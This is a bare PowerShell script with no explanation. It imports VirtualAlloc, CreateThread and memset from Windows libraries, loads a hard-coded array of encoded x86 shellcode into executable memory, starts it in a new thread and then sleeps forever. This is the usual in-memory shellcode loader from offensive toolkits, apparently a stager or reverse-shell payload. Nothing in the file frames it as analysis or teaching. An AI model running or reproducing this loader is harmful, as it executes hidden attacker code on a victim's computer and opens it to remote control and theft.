
$j3p = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $j3p -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc7,0xd9,0x74,0x24,0xf4,0xbf,0x0c,0x63,0x98,0xaf,0x5a,0x33,0xc9,0xb1,0x56,0x83,0xc2,0x04,0x31,0x7a,0x14,0x03,0x7a,0x18,0x81,0x6d,0x53,0xc8,0xc7,0x8e,0xac,0x08,0xa8,0x07,0x49,0x39,0xe8,0x7c,0x19,0x69,0xd8,0xf7,0x4f,0x85,0x93,0x5a,0x64,0x1e,0xd1,0x72,0x8b,0x97,0x5c,0xa5,0xa2,0x28,0xcc,0x95,0xa5,0xaa,0x0f,0xca,0x05,0x93,0xdf,0x1f,0x47,0xd4,0x02,0xed,0x15,0x8d,0x49,0x40,0x8a,0xba,0x04,0x59,0x21,0xf0,0x89,0xd9,0xd6,0x40,0xab,0xc8,0x48,0xdb,0xf2,0xca,0x6b,0x08,0x8f,0x42,0x74,0x4d,0xaa,0x1d,0x0f,0xa5,0x40,0x9c,0xd9,0xf4,0xa9,0x33,0x24,0x39,0x58,0x4d,0x60,0xfd,0x83,0x38,0x98,0xfe,0x3e,0x3b,0x5f,0x7d,0xe5,0xce,0x44,0x25,0x6e,0x68,0xa1,0xd4,0xa3,0xef,0x22,0xda,0x08,0x7b,0x6c,0xfe,0x8f,0xa8,0x06,0xfa,0x04,0x4f,0xc9,0x8b,0x5f,0x74,0xcd,0xd0,0x04,0x15,0x54,0xbc,0xeb,0x2a,0x86,0x1f,0x53,0x8f,0xcc,0x8d,0x80,0xa2,0x8e,0xd9,0x38,0xd8,0x44,0x19,0xad,0x55,0xcc,0x77,0x44,0xce,0x66,0xcb,0xe1,0xc8,0x71,0x2c,0xd8,0x24,0xa5,0x81,0xb0,0x15,0x0a,0x76,0x5f,0xa0,0xfa,0x01,0x38,0x2b,0xd7,0xa2,0x15,0xbe,0xdb,0x17,0xc9,0x56,0x61,0x96,0xed,0xa6,0x71,0x14,0xed,0xa6,0x81,0x0b,0xaf,0xe1,0xb6,0x05,0x68,0xee,0xe8,0xc1,0x21,0x67,0x97,0xd7,0x31,0xa2,0x21,0x11,0x9e,0x25,0x32,0xaf,0xc1,0x32,0x61,0x9c,0x52,0x6c,0xd5,0x74,0x3d,0x79,0x8c,0x56,0x86,0x82,0xfa,0x30,0x92,0x76,0x5a,0x54,0xe3,0xb4,0x64,0xa4,0x6a,0x5a,0x0e,0xa0,0x3c,0xf1,0xd0,0xfe,0xd4,0x70,0xa9,0x60,0xa2,0x84,0xe0,0xcf,0xf8,0x29,0x58,0xb9,0x96,0xe0,0x58,0x5d,0x1c,0x04,0xb1,0xd8,0x22,0x8f,0x30,0xad,0xd7,0xa9,0x2d,0xc1,0xad,0xe8,0xf8,0xde,0x1b,0x86,0x44,0x48,0xa4,0x47,0x45,0x88,0xcc,0x67,0x45,0xc8,0x0c,0x3b,0x2d,0x90,0xa8,0xe8,0x48,0xdf,0x64,0x9d,0xc0,0x4c,0x0e,0x45,0xb1,0x1a,0x10,0xaa,0x3e,0xda,0x43,0xfc,0x56,0xc8,0xf5,0x89,0x45,0x13,0x2c,0x0c,0x49,0x9f,0x02,0x84,0x4d,0x5e,0x5e,0x1e,0x91,0x15,0x85,0x79,0xd1,0x8a,0xad,0x0f,0x2a,0xcb,0xd1,0xc1,0xe6,0x04,0x00,0x12,0x29,0x5a,0x72,0x60,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$sWX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($sWX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$sWX,0,0,0);for (;;){Start-sleep 60};
